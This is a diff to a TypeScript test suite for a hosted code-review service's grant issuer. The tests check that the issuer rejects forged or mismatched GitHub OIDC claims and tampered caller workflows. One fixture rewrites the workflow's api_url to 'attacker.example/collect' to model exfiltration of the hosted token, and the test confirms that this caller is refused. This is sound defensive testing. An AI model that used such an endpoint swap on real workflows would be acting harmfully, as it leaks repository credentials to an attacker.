@@ -11,7 +11,8 @@ import {
 } from "@reviewrouter/features-hosted-account-pool";
 import {
   hostedPoolWorkflowSemanticSha256,
-  renderCanonicalHostedPoolWorkflowV5,
+  hostedPoolWorkflowSchemaVersion,
+  renderCanonicalHostedPoolWorkflowV2,
 } from "@reviewrouter/features-workflow-provisioning";
 import {
   HostedCodexGrantIssuer,
@@ -21,9 +22,13 @@ import {
 const now = new Date("2026-08-15T10:00:00.000Z");
 const commitSha = "a".repeat(40);
 const workflowPath = ".github/workflows/reviewrouter-hosted.yml";
-const workflowSource = `acme/private-repo/${workflowPath}@refs/heads/main`;
-const workflowJobSource = `777genius/review-router/.github/workflows/reviewrouter-execution-reusable.yml@${commitSha}`;
-const workflow = renderCanonicalHostedPoolWorkflowV5({
+const pullRequestNumber = 42;
+const reviewHeadSha = "e".repeat(40);
+const reviewRevisionHash = "f".repeat(64);
+const pullRequestRef = `refs/pull/${pullRequestNumber}/merge`;
+const workflowSource = `acme/private-repo/${workflowPath}@${pullRequestRef}`;
+const workflowJobSource = `777genius/review-router/.github/workflows/reviewrouter-t0-reusable.yml@${commitSha}`;
+const workflow = renderCanonicalHostedPoolWorkflowV2({
   actionRef: `777genius/review-router@${commitSha}`,
   apiUrl: "https://api.reviewrouter.dev",
   providerInstanceId: "hosted-pool:repository:123",
@@ -32,6 +37,46 @@ const workflow = renderCanonicalHostedPoolWorkflowV5({
 });
 
 describe("HostedCodexGrantIssuer", () => {
+  it("admits a realistic pull_request merge-ref caller bound to the admitted head", async () => {
+    const fixture = createFixture();
+
+    await expect(fixture.issuer.issue(request())).resolves.toMatchObject({
+      repository: "acme/private-repo",
+      runtimeConfigVersion: 19,
+    });
+    expect(fixture.replayNonces.tryConsumeNonce).toHaveBeenCalledOnce();
+  });
+
+  it("rejects the r44 same-repository PR caller that exfiltrates the hosted token", async () => {
+    const exfiltratingCaller = workflow.replace(
+      'api_url: "https://api.reviewrouter.dev"',
+      'api_url: "https://attacker.example/collect"',
+    );
+    const fixture = createFixture({
+      workflowContents: exfiltratingCaller,
+      workflowSourceBlobSha: "9".repeat(40),
+    });
+
+    await expect(fixture.issuer.issue(request())).rejects.toThrow(
+      "hosted_workflow_attestation_blob_mismatch",
+    );
+    expect(fixture.replayNonces.tryConsumeNonce).not.toHaveBeenCalled();
+    expect(fixture.grantCapabilities.issue).not.toHaveBeenCalled();
+    expect(fixture.commentTokens.issueCommentToken).not.toHaveBeenCalled();
+  });
+
+  it("rejects any caller byte mismatch even if blob evidence repeats the attested blob", async () => {
+    const fixture = createFixture({
+      workflowContents: `${workflow}# untrusted caller byte\n`,
+    });
+
+    await expect(fixture.issuer.issue(request())).rejects.toThrow(
+      "hosted_workflow_attestation_digest_mismatch",
+    );
+    expect(fixture.replayNonces.tryConsumeNonce).not.toHaveBeenCalled();
+    expect(fixture.commentTokens.issueCommentToken).not.toHaveBeenCalled();
+  });
+
   it("issues from server-derived exact authority and persists separate capabilities", async () => {
     const fixture = createFixture();
 
@@ -85,10 +130,71 @@ describe("HostedCodexGrantIssuer", () => {
     expect(fixture.replayNonces.tryConsumeNonce).not.toHaveBeenCalled();
   });
 
+  it("rejects pull_request_target claims before consuming OIDC", async () => {
+    const fixture = createFixture({}, { event_name: "pull_request_target" });
+    await expect(fixture.issuer.issue(request())).rejects.toThrow(
+      "hosted_workflow_claims_mismatch",
+    );
+    expect(fixture.replayNonces.tryConsumeNonce).not.toHaveBeenCalled();
+  });
+
   it.each([
-    `777genius/review-router/.github/workflows/reviewrouter-t0-reusable.yml@${commitSha}`,
-    `evil/review-router/.github/workflows/reviewrouter-execution-reusable.yml@${commitSha}`,
-    "777genius/review-router/.github/workflows/reviewrouter-execution-reusable.yml@refs/heads/main",
+    ["mismatched PR ref", { ref: "refs/pull/41/merge" }],
+    ["missing PR ref", { ref: undefined }],
+    ["PR head ref", { ref: "refs/pull/42/head" }],
+    [
+      "mismatched caller workflow PR identity",
+      {
+        workflow_ref: `acme/private-repo/${workflowPath}@refs/pull/41/merge`,
+      },
+    ],
+    [
+      "default-branch caller fallback",
+      { workflow_ref: `acme/private-repo/${workflowPath}@refs/heads/main` },
+    ],
+    ["mismatched caller SHA", { workflow_sha: "b".repeat(40) }],
+    ["uppercase caller SHA", { workflow_sha: "E".repeat(40) }],
+    ["missing caller SHA", { workflow_sha: undefined }],
+    [
+      "mismatched caller repository",
+      {
+        workflow_ref: `evil/private-repo/${workflowPath}@${pullRequestRef}`,
+      },
+    ],
+    ["mismatched repository claim", { repository: "evil/private-repo" }],
+    ["mismatched repository id", { repository_id: "124" }],
+    ["mismatched repository owner", { repository_owner: "evil" }],
+    [
+      "mismatched subject repository",
+      { sub: "repo:evil/private-repo:pull_request" },
+    ],
+    [
+      "mismatched subject event",
+      { sub: "repo:acme/private-repo:environment:prod" },
+    ],
+  ] as const)("rejects %s before consuming OIDC", async (_name, override) => {
+    const fixture = createFixture({}, override);
+    await expect(fixture.issuer.issue(request())).rejects.toThrow();
+    expect(fixture.replayNonces.tryConsumeNonce).not.toHaveBeenCalled();
+    expect(fixture.grantCapabilities.issue).not.toHaveBeenCalled();
+  });
+
+  it.each([
+    ["admitted PR number", { pullRequestNumber: 41 }],
+    ["admitted head SHA", { reviewHeadSha: "b".repeat(40) }],
+  ] as const)("rejects a mismatched %s", async (_name, admissionOverride) => {
+    const fixture = createFixture(admissionOverride);
+    await expect(fixture.issuer.issue(request())).rejects.toThrow(
+      "hosted_workflow_claims_mismatch",
+    );
+    expect(fixture.replayNonces.tryConsumeNonce).not.toHaveBeenCalled();
+  });
+
+  it.each([
+    undefined,
+    `777genius/review-router/.github/workflows/reviewrouter-execution-reusable.yml@${commitSha}`,
+    `evil/review-router/.github/workflows/reviewrouter-t0-reusable.yml@${commitSha}`,
+    "777genius/review-router/.github/workflows/reviewrouter-t0-reusable.yml@refs/heads/main",
   ])("rejects non-exact hosted execution source %s", async (jobWorkflowRef) => {
     const fixture = createFixture({}, { job_workflow_ref: jobWorkflowRef });
     await expect(fixture.issuer.issue(request())).rejects.toThrow();
@@ -124,10 +230,15 @@ describe("HostedCodexGrantIssuer", () => {
 
 function createFixture(
   overrides: Partial<HostedCodexGrantAdmission> = {},
-  claimOverrides: {
-    [K in keyof ReturnType<typeof claims>]?:
-      | ReturnType<typeof claims>[K]
-      | undefined;
+  claimOverrides: Omit<
+    {
+      [K in keyof ReturnType<typeof claims>]?:
+        | ReturnType<typeof claims>[K]
+        | undefined;
+    },
+    "event_name"
+  > & {
+    readonly event_name?: "pull_request" | "pull_request_target";
   } = {},
 ) {
   const admission: HostedCodexGrantAdmission = {
@@ -143,10 +254,13 @@ function createFixture(
     bindingId: "binding-1",
     bindingRevision: 7,
     authzEpoch: 3n,
-    workflowSchemaVersion: 5,
+    workflowSchemaVersion: hostedPoolWorkflowSchemaVersion,
     workflowSource,
     workflowJobSource,
     workflowJobSha: commitSha,
+    pullRequestNumber,
+    reviewHeadSha,
+    reviewRevisionHash,
     workflowAttestation: {
       repositoryId: "123",
       workflowPath,
@@ -159,7 +273,7 @@ function createFixture(
       bindingRevision: 7,
     },
     workflowPath,
-    workflowSourceCommitSha: commitSha,
+    workflowSourceCommitSha: reviewHeadSha,
     workflowSourceBlobSha: "c".repeat(40),
     workflowContents: workflow,
     reviewRequestId: "review-request-1",
@@ -292,7 +406,7 @@ function request() {
   return {
     oidcToken: "oidc-token".repeat(4),
     providerInstanceId: "hosted-pool:repository:123",
-    workflowSchemaVersion: 5,
+    workflowSchemaVersion: hostedPoolWorkflowSchemaVersion,
     bindingId: "binding-1",
     bindingVersion: 7,
   };
@@ -307,11 +421,12 @@ function claims() {
     repository_id: "123",
     repository_owner: "acme",
     repository_visibility: "private",
-    event_name: "pull_request_target" as const,
+    event_name: "pull_request" as const,
+    ref: pullRequestRef,
     run_id: "9001",
     run_attempt: "2",
     workflow_ref: workflowSource,
-    workflow_sha: commitSha,
+    workflow_sha: reviewHeadSha,
     job_workflow_ref: workflowJobSource,
     job_workflow_sha: commitSha,
     actor: "octocat",
